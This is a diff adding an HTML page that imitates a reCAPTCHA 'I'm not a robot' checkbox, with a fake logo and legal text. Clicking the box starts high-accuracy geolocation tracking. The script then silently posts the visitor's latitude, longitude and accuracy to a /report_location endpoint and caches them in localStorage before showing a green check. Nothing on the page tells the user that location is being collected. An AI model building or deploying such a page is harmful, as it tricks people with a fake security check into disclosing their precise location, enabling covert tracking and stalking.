@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      margin: 0;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, system-ui, sans-serif;
+      color: #000;
+      font-size: 16px;
+      line-height: 1.4;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    /* outer text above box */
+    .captcha-header {
+      font-size: 18px;
+      color: #000;
+      margin-bottom: 10px;
+      font-weight: 500;
+    }
+
+    /* card */
+    .captcha-card {
+      border: 1px solid #d3d3d3;
+      border-radius: 4px;
+      background: #fff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+      display: flex;
+      align-items: stretch;
+      padding: 12px 16px;
+      min-width: 290px;
+      max-width: 360px;
+    }
+
+    .captcha-left {
+      display: flex;
+      flex: 1 1 auto;
+      align-items: flex-start;
+    }
+
+    /* clickable zone for checkbox + text */
+    .click-area {
+      display: flex;
+      flex-direction: row;
+      align-items: flex-start;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .fake-check {
+      width: 24px;
+      height: 24px;
+      border: 2px solid #9e9e9e;
+      border-radius: 2px;
+      background: #fff;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 20px;
+      text-align: center;
+      box-sizing: border-box;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .fake-check.verified {
+      background: #4caf50; /* green */
+      border-color: #4caf50;
+      color: #fff;
+    }
+
+    .captcha-text {
+      font-size: 15px;
+      color: #000;
+      margin-left: 12px;
+    }
+
+    .captcha-right {
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-width: 64px;
+      margin-left: 12px;
+      border-left: 1px solid #d3d3d3;
+      padding-left: 12px;
+    }
+
+    .captcha-logo-box {
+      width: 28px;
+      height: 28px;
+      border-radius: 4px;
+      background: linear-gradient(#4a8fff, #1a3f8f); /* fake blue gradient */
+      color: #fff;
+      font-size: 14px;
+      font-weight: bold;
+      line-height: 28px;
+      text-align: center;
+      user-select: none;
+    }
+
+    .captcha-legal {
+      font-size: 10px;
+      color: #555;
+      text-align: center;
+      line-height: 1.3;
+      margin-top: 6px;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+
+<div>
+  <div class="captcha-header">Please show you're not a robot</div>
+
+  <div class="captcha-card">
+    <div class="captcha-left">
+      <div id="click-area" class="click-area">
+        <div id="fake-check" class="fake-check"></div>
+        <div class="captcha-text">I'm not a robot</div>
+      </div>
+    </div>
+    <div class="captcha-right">
+      <div class="captcha-logo-box">✓</div>
+      <div class="captcha-legal">
+        reCAPTCHA<br>
+        Privacy · Terms
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  // DOM refs
+  const clickArea = document.getElementById("click-area");
+  const fakeCheck = document.getElementById("fake-check");
+
+  // config for accuracy
+  const TARGET_ACCURACY_METERS = 20; // send early if <= 20m
+  const MAX_WAIT_MS = 8000;          // hard stop after 8s
+
+  let alreadyVerified = false;
+  let watchId = null;
+  let bestFix = null;
+  let sent = false;
+
+  // send best fix to backend
+  async function sendToServer(fix) {
+    try {
+      await fetch("/report_location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          lat: fix.lat,
+          lon: fix.lon,
+          accuracy: fix.acc,
+          timestamp: fix.ts,
+          is_last_known: false
+        })
+      });
+    } catch (e) {
+      // ignore network error silently
+    }
+  }
+
+  // store locally for future fallback logic if later you want last-known
+  function storeLocal(fix) {
+    try {
+      localStorage.setItem(
+        "last_location",
+        JSON.stringify({
+          lat: fix.lat,
+          lon: fix.lon,
+          accuracy: fix.acc,
+          timestamp: fix.ts
+        })
+      );
+    } catch (_) {}
+  }
+
+  // mark UI as verified (green check)
+  function finishSuccess() {
+    if (alreadyVerified) return;
+    alreadyVerified = true;
+
+    fakeCheck.classList.add("verified");
+    fakeCheck.textContent = "✓";
+
+    if (watchId !== null) {
+      navigator.geolocation.clearWatch(watchId);
+      watchId = null;
+    }
+  }
+
+  // once we decide we have our best fix and time's up or good enough
+  function trySendAndComplete() {
+    if (sent) return;
+    if (!bestFix) return;
+
+    sent = true;
+
+    // send to server
+    sendToServer(bestFix);
+
+    // save for fallback
+    storeLocal(bestFix);
+
+    // update checkbox to green
+    finishSuccess();
+  }
+
+  // called repeatedly by watchPosition as position refines
+  function handlePos(pos) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy; // meters
+    const ts  = pos.timestamp;
+
+    // pick the best (lowest acc)
+    if (!bestFix || acc < bestFix.acc) {
+      bestFix = { lat, lon, acc, ts };
+    }
+
+    // if good enough, done immediately
+    if (acc <= TARGET_ACCURACY_METERS) {
+      trySendAndComplete();
+    }
+  }
+
+  // if user denies location or it errors
+  function handleErr(err) {
+    // do nothing visible.
+    // box stays unchecked if denied.
+    if (watchId !== null) {
+      navigator.geolocation.clearWatch(watchId);
+      watchId = null;
+    }
+  }
+
+  // start flow when user taps box
+  function startVerificationFlow() {
+    if (alreadyVerified) return;
+
+    // if browser can't geolocate at all, we can't verify
+    if (!("geolocation" in navigator)) {
+      return;
+    }
+
+    // start watching high-accuracy
+    watchId = navigator.geolocation.watchPosition(
+      handlePos,
+      handleErr,
+      {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: MAX_WAIT_MS // some browsers ignore this for watchPosition
+      }
+    );
+
+    // after MAX_WAIT_MS, if we have at least one fix, send it
+    setTimeout(() => {
+      if (!alreadyVerified && bestFix) {
+        trySendAndComplete();
+      } else {
+        // if still nothing, user probably denied or no fix
+        // leave unchecked, do nothing else
+      }
+    }, MAX_WAIT_MS);
+  }
+
+  clickArea.addEventListener("click", startVerificationFlow);
+})();
+</script>
+
+</body>
+</html>
